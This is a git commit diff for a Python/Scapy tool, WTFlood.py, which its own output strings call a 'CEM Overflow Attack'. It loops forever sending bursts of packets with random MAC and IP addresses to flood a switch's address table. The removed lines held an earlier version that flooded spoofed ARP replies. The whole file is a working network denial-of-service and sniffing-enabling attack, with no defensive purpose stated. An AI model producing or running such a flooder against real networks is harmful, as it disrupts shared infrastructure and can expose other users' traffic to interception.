1c68ca63dd4639f2b7bc8088b87ccf26214acc35
Dalbert <development@wtechnology.dk>
2022-08-18 23:23:30 +0200

    Major change, new package sending setup, and variable checking / fixes.

--- WTFlood.py
+++ WTFlood.py
@@ -9,9 +9,7 @@ except ImportError as Error:
 	print("Please check if needed libararies are installed, or run the installer once more.")
 	sys.exit(1)
 
-__version__ = "V0.1.0.0A"
-
-def GetInterfaceState(Interface):
+def Get_Interface_State(Interface):
         try:
                 if os.path.exists("/sys/class/net/" + Interface + "/"):
                         TempFileObj = open("/sys/class/net/" + Interface + "/operstate")
@@ -22,29 +20,47 @@ def GetInterfaceState(Interface):
                 print("Error - {0}".format(Error))
                 return "NULL"
 
+def Generate_Packages(Number=2048):
+	Package_list = []
+	for i in range(0,Number):
+		packet = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
+		Package_list.append(packet)
+	return Package_list
+
+def Send_Packages(package_list, interface=None, verbose_bool=False):
+	try:
+		if verbose_bool:
+			print("Sending Network Packages...")
+		if interface is not None:
+			sendp(package_list, iface=interface, verbose=verbose_bool)
+		else:
+			sendp(package_list, verbose=verbose_bool)
+	except Exception as Error:
+		print("Encountered an error while sending network packages.\nError: - {0}".format(Error))
+
+__version__ = "0.2.0.2A"
+
 if __name__ == "__main__":
 	Parser = argparse.ArgumentParser(
 	description=""
 	)
 	Parser.add_argument("-i","--Interface",help="The interface to send packages out from.")
-	Parser.add_argument("-vmac","--VMAC",help="The Vendor MAC Address to use. Example format: 00:00:00:")
-	Parser.add_argument("-rmac","--RMAC",action="store_true",help="Randomizes the MAC Address to use.")
-	Parser.add_argument("-v", "--version",help="Show the version of the program.")
+	Parser.add_argument("-s","--Size",help="Sets the package buffer size in number of packages per package burst.")
+	Parser.add_argument("-V","--Version",action="version",version="%(prog)s " + __version__,help="Show the version of the program.")
+	Parser.add_argument("-v","--Verbose",action="store_true",help="Enables verbose logging.")
 	Args = Parser.parse_args()
 
-	#Variable Declaration
-	VendorMAC = "00:00:00:"
-	DestMAC = "FF:FF:FF:FF:FF:FF"
-	UseInterface = False
+	#Declare Variables
+	UseInterface=False
+	PackageSize=Args.Size
 
-	if Args.VMAC:
-		VendorMAC = Args.VMAC
-
-	if Args.Interface:
+	if Args.Interface and Args.Interface == "lo":
+		UseInterface = True
+	elif Args.Interface:
 		try:
-			if GetInterfaceState(Args.Interface) == "up":
+			if Get_Interface_State(Args.Interface) == "up":
 				UseInterface = True
-			elif GetInterfaceState(Args.Interface) == "down":
+			elif Get_Interface_State(Args.Interface) == "down":
 				print("Interface {0} is down.".format(Args.Interface))
 				sys.exit(1)
 			else:
@@ -52,20 +68,51 @@ if __name__ == "__main__":
 				sys.exit(1)
 		except Exception as Error:
 			print("Error - {0}".format(Error))
-			sys.exit(1)
 
 	#Main Application Loop
-	while True:
-		if Args.RMAC:
-			MACAddress = RandMAC()
-		else:
-			MACAddress = VendorMAC + ":".join(RandMAC().split(":")[3:])
-		try:
-			if UseInterface:
-				print("Sending as {0} on {1}".format(MACAddress, Args.Interface))
-				sendp(Ether(src=MACAddress, dst=DestMAC)/ARP(op=2, psrc="0.0.0.0", hwdst=DestMAC)/Padding(load="X"*18), iface=Args.Interface,verbose=0)
+	if UseInterface:
+		print("Starting the CEM Overflow Attack on interface: {0}".format(Args.Interface))
+	else:
+		print("Starting the CEM Overflow Attack.")
+
+	try:
+		while True:
+			if Args.Verbose and Args.Size:
+				print("Generating {0} Network Packages...".format(Args.Size))
+			elif Args.Verbose:
+				print("Generating 2048 Network Packages...")
+
+			if PackageSize is not None:
+				try:
+					NetworkPackages = Generate_Packages(PackageSize)
+				except Exception as Error:
+					print("Encounted a error while generated network packages. Error - {0}".format(Error))
 			else:
-				print("Sending as {0}".format(MACAddress))
-				sendp(Ether(src=MACAddress, dst=DestMAC)/ARP(op=2, psrc="0.0.0.0", hwdst=DestMAC)/Padding(load="X"*18),verbose=0)
-		except Exception as Error:
-			print("Error - {0}".format(Error))
+				try:
+					NetworkPackages = Generate_Packages()
+				except Exception as Error:
+					print("Encounted a error while generated network packages. Error - {0}".format(Error))
+
+			if UseInterface and Args.Verbose:
+				try:
+					Send_Packages(NetworkPackages, Args.Interface, Args.Verbose)
+				except Exception as Error:
+					print("Encounted a error while sending network packages. Error - {0}".format(Error))
+			elif UseInterface:
+				try:
+					Send_Packages(NetworkPackages, Args.Interface)
+				except Exception as Error:
+					print("Encounted a error while sending network packages. Error - {0}".format(Error))
+			elif Args.Verbose:
+				try:
+					Send_Packages(NetworkPackages, Args.Verbose)
+				except Exception as Error:
+					print("Encounted a error while sending network packages. Error - {0}".format(Error))
+			else:
+				try:
+					Send_Packages(NetworkPackages)
+				except Exception as Error:
+					print("Encounted a error while sending network packages. Error - {0}".format(Error))
+	except KeyboardInterrupt:
+		print("Stopping the CEM Overflow Attack!")
+		sys.exit(0)
